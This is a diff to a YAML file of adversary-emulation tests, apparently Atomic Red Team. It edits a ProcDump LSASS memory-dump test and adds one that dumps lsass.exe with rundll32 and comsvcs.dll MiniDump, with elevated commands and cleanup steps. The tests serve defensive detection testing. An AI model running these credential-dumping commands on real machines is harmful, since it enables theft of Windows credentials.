@@ -20053,7 +20053,7 @@ credential-access:
         The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
         ProcDump.
 
-        Upon successful execution, you should see a file the following file created C:\Windows\Temp\lsass_dump.dmp.
+        Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
 
         If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
       supported_platforms:
@@ -20082,6 +20082,23 @@ credential-access:
         name: command_prompt
         command: "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n"
         cleanup_command: 'del "#{output_file}" >nul 2> nul
+
+'
+    - name: Dump LSASS.exe Memory using comsvcs.dll
+      description: |
+        The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
+
+        Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
+      supported_platforms:
+      - windows
+      executor:
+        elevation_required: true
+        name: powershell
+        command: 'C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll,
+          MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+
+'
+        cleanup_command: 'Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
 
 '
     - name: Dump LSASS.exe Memory using Windows Task Manager
